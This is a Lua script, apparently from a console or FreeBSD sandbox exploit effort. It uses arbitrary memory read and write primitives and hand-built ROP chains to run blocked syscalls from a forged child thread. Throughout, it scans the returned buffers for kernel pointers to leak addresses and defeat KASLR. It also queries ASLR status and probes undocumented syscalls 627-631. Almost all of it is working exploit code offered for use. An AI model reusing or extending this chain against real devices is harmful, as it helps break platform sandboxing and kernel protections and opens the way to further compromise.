-- CRASH_CLASS: HIGH
-- PROBE 112a: survey of "blocked" syscalls from child thread
--
-- fstat(189) works from child but kills from make_syscall (loader-blocked).
-- kldnext(307) kills from child too (kernel-blocked).
-- This probe tests other blocked/killed syscalls from child to find
-- more loader-blocked ones that might leak kernel info.
--
-- Strategy: test from LEAST to MOST dangerous. Each test is independent.
-- If a test kills, we lose everything after it — order matters.
--
-- Safe tier (return -1 from make_syscall, unlikely to kill):
--   fstatfs(397), getfsstat(395), getdirentries(196), procctl(544)
--   sysctlbyname(570)
--
-- Dangerous tier (kill from make_syscall):
--   sys 627-630 (PCALL-FAIL), sys 631 (kill)

print("=== PROBE 112a: CHILD THREAD SYSCALL SURVEY ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function get_hi_lo(val)
    if type(val)=="table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function is_kptr(val)
    if val==nil then return false end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    return h>=0xFFFF8000 and h~=0xFFFFFFFF
end
local function fmt_ptr(val)
    if val==nil then return "nil" end
    local h,l = get_hi_lo(val)
    if h<0 then h=h+0x100000000 end
    if l<0 then l=l+0x100000000 end
    return string.format("0x%X%08X",h,l)
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO SA") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local function ga(off) return uint64(string.format("0x%X%08X",ehi,elo+off)) end
local PRAX=ga(0x992); local PRDI=ga(0xC9DFE)
local PRSI=ga(0xD77D); local WMOV=ga(0x92C67)

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local mm=mk(477); local tc=mk(430)

local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(16*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)
local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl500=R+0x40; wq(sl500,uint64(0)); wq(sl500+8,uint64(500000000))
local tb=R+0x80
local RESULT=R+0x1000
local child_stk=R+0x4000*2
local child_ctx=R+0x4000*4
local BUF=R+0x4000*6  -- general output buffer (4 pages = 64KB)

local function child_syscall(label, sysno, a1, a2, a3, a4, a5)
    z(child_ctx, 0x200)
    wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
    wq(child_ctx+_TP,uint64(0x10000))
    wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
    wq(child_ctx+_SP,uint64(child_stk))
    wq(child_ctx+_IP,SA)
    wq(child_ctx+_AX,uint64(sysno))
    wq(child_ctx+_DI,uint64(a1 or 0))
    wq(child_ctx+_SI,uint64(a2 or 0))
    wq(child_ctx+_DX,uint64(a3 or 0))
    wq(child_ctx+_R10,uint64(a4 or 0))
    wq(child_ctx+_R8,uint64(a5 or 0))

    local off=0
    wq(child_stk+off,PRDI); off=off+8
    wq(child_stk+off,uint64(RESULT)); off=off+8
    wq(child_stk+off,WMOV); off=off+8
    wq(child_stk+off,PRDI); off=off+8
    wq(child_stk+off,uint64(ts999)); off=off+8
    wq(child_stk+off,PRSI); off=off+8
    wq(child_stk+off,uint64(0)); off=off+8
    wq(child_stk+off,PRAX); off=off+8
    wq(child_stk+off,uint64(240)); off=off+8
    wq(child_stk+off,SA); off=off+8

    wq(RESULT,uint64(0xDEADCAFE))
    wq(tb,uint64(0))
    pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)
    native.fcall_with_rax(stub,240,N(sl500),0)

    local c = N(native.fcall_with_rax(stub,20))
    if c~=pid then
        print(string.format("  %s: PROCESS KILLED", label))
        return nil, false
    end

    local rv_lo = rd(RESULT) or 0
    local rv_hi = rd(RESULT+4) or 0
    if rv_lo==0xDEADCAFE and rv_hi==0 then
        print(string.format("  %s: SENTINEL (child died)", label))
        return -999, true
    end

    local signed = rv_lo
    if rv_hi==0xFFFFFFFF then signed = -1 end

    print(string.format("  %s: rv=%d (raw=0x%X%08X)", label, signed, rv_hi, rv_lo))
    return signed, true
end

local function scan_buf_kptrs(buf_addr, size, label)
    local found = 0
    for off=0,size-8,8 do
        local val = rq(buf_addr+off)
        if is_kptr(val) then
            found = found + 1
            print(string.format("    *** KPTR %s+0x%X: %s ***", label, off, fmt_ptr(val)))
            if found >= 10 then print("    (capped)") break end
        end
    end
    return found
end

-- ============================================================
print("")
print("--- A: fstatfs(397) — filesystem stat on fd ---")
-- fstatfs(int fd, struct statfs *buf)
-- struct statfs is large (~472 bytes on FreeBSD) and contains
-- f_mntfromname, f_mntonname paths, and potentially device info
z(BUF, 0x400)
local rv, alive = child_syscall("fstatfs(fd=3)", 397, 3, BUF)
if not alive then return end
if rv==0 then
    print("  *** FSTATFS WORKS! ***")
    local kp = scan_buf_kptrs(BUF, 0x200, "statfs")
    -- Dump first 128 bytes for structure analysis
    for off=0,0x78,8 do
        local val = rq(BUF+off)
        print(string.format("    +0x%02X: %s", off, fmt_ptr(val)))
    end
    -- f_mntfromname is at +0x188 (88 bytes), f_mntonname at +0x1E0
    local mnt_bytes = {}
    for i=0,31 do
        local b = rd(BUF+0x188+i)
        if b==nil then break end
        local c = b%256
        if c==0 then break end
        mnt_bytes[#mnt_bytes+1] = string.char(c)
    end
    if #mnt_bytes>0 then
        print(string.format("    f_mntfromname: '%s'", table.concat(mnt_bytes)))
    end
end

-- ============================================================
print("")
print("--- B: getfsstat(395) — list all filesystems ---")
-- getfsstat(struct statfs *buf, long bufsize, int mode)
-- MNT_NOWAIT=2
z(BUF, 0x4000)
rv, alive = child_syscall("getfsstat(buf,0x4000,2)", 395, BUF, 0x4000, 2)
if not alive then return end
if rv and rv > 0 then
    print(string.format("  *** GETFSSTAT WORKS! %d filesystems ***", rv))
    local kp = scan_buf_kptrs(BUF, math.min(rv*472, 0x4000), "fsstat")
    print(string.format("  kernel pointers: %d", kp))
end

-- ============================================================
print("")
print("--- C: getdirentries(196) from child ---")
-- First open "/" with openat (AT_FDCWD, "/", O_RDONLY)
-- openat = 499
local path_buf = memory.alloc(8)
wd(path_buf, 0x0000002F)  -- "/" + null
local AT_FDCWD = 0xFFFFFFFFFFFFFF9C

z(BUF, 0x1000)
rv, alive = child_syscall("openat(AT_FDCWD,'/',O_RDONLY)", 499,
    AT_FDCWD, N(path_buf), 0, 0)  -- O_RDONLY=0
if not alive then return end

if rv and rv >= 0 then
    local dir_fd = rv
    print(string.format("  opened '/' as fd=%d", dir_fd))

    -- Now getdirentries(fd, buf, nbytes, basep)
    local basep = memory.alloc(8)
    wq(basep, uint64(0))
    z(BUF, 0x1000)
    rv, alive = child_syscall("getdirentries(fd,buf,0x1000,basep)", 196,
        dir_fd, BUF, 0x1000, N(basep))
    if not alive then return end
    if rv and rv > 0 then
        print(string.format("  *** GETDIRENTRIES WORKS! %d bytes ***", rv))
        local kp = scan_buf_kptrs(BUF, rv, "dirent")
        -- Parse first few dirents
        local pos = 0
        local count = 0
        while pos < rv and count < 10 do
            local d_fileno = rd(BUF+pos)
            local d_reclen_raw = rd(BUF+pos+4)
            if d_reclen_raw==nil then break end
            local d_reclen = d_reclen_raw % 0x10000  -- low 16 bits
            local d_type = math.floor(d_reclen_raw / 0x10000) % 256
            local d_namlen = math.floor(d_reclen_raw / 0x1000000)
            if d_reclen==0 then break end
            -- Read name
            local name_bytes = {}
            for i=0,math.min(d_namlen,63)-1 do
                local b = rd(BUF+pos+8+i)
                if b==nil then break end
                local c = b%256
                if c==0 then break end
                name_bytes[#name_bytes+1] = string.char(c)
            end
            local ino_q = rq(BUF+pos)
            print(string.format("    ino=%s type=%d name='%s'",
                fmt_ptr(ino_q), d_type, table.concat(name_bytes)))
            if is_kptr(ino_q) then
                print("    *** INODE IS KERNEL POINTER! ***")
            end
            pos = pos + d_reclen
            count = count + 1
        end
    end
    -- Close the fd
    child_syscall("close(dir_fd)", 6, dir_fd)
end

-- ============================================================
print("")
print("--- D: procctl(544) — process control ---")
-- procctl(idtype_t idtype, id_t id, int cmd, void *data)
-- P_PID=0, PROC_ASLR_STATUS=19, PROC_REAP_STATUS=15
-- PROC_SPROTECT=8

z(BUF, 0x100)
-- Try PROC_ASLR_STATUS (cmd=19)
rv, alive = child_syscall("procctl(P_PID,pid,ASLR_STATUS)", 544,
    0, pid, 19, BUF)
if not alive then return end
if rv==0 then
    print("  *** PROCCTL ASLR_STATUS WORKS! ***")
    local status = rd(BUF)
    print(string.format("    ASLR status: 0x%X", status or 0))
end

-- Try PROC_REAP_STATUS (cmd=15)
z(BUF, 0x100)
rv, alive = child_syscall("procctl(P_PID,pid,REAP_STATUS)", 544,
    0, pid, 15, BUF)
if not alive then return end

-- Try PROC_SPROTECT (cmd=8) — read mode
z(BUF, 0x100)
wd(BUF, 0)  -- PPROT_STATUS
rv, alive = child_syscall("procctl(P_PID,pid,SPROTECT)", 544,
    0, pid, 8, BUF)
if not alive then return end

-- ============================================================
print("")
print("--- E: sysctlbyname(570) from child ---")
-- sysctlbyname(name, oldp, oldlenp, newp, newlen)
local sbn_name = memory.alloc(32)
wd(sbn_name, 0x6E72656B)     -- "kern"
wd(sbn_name+4, 0x74736F2E)   -- ".ost"
wd(sbn_name+8, 0x00657079)   -- "ype\0"

z(BUF, 0x100)
local sbn_len = memory.alloc(8)
wq(sbn_len, uint64(0x100))

rv, alive = child_syscall("sysctlbyname('kern.ostype')", 570,
    N(sbn_name), BUF, N(sbn_len), 0, 0)
if not alive then return end
if rv==0 then
    print("  *** SYSCTLBYNAME WORKS! ***")
    local out = {}
    for i=0,31 do
        local b = rd(BUF+i)
        if b==nil then break end
        local c=b%256; if c==0 then break end
        out[#out+1]=string.char(c)
    end
    print(string.format("    kern.ostype='%s'", table.concat(out)))
end

-- ============================================================
print("")
print("--- F: DANGEROUS TIER — sys 627-630 (PCALL-FAIL from make_syscall) ---")
-- These gave PCALL-FAIL, not kills. From child, they might work differently.
for sn=627,630 do
    z(BUF, 0x100)
    rv, alive = child_syscall(string.format("sys%d(0,0,0)", sn), sn, 0, 0, 0)
    if not alive then
        print(string.format("  sys %d KILLED — stopping dangerous tier", sn))
        return
    end
end

-- ============================================================
print("")
print("--- G: sys 631 (kills from make_syscall) ---")
z(BUF, 0x100)
rv, alive = child_syscall("sys631(0,0,0)", 631, 0, 0, 0)
if not alive then
    print("  sys 631 KILLED from child too")
    return
end

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "FAIL"))
print("=== 112a COMPLETE ===")
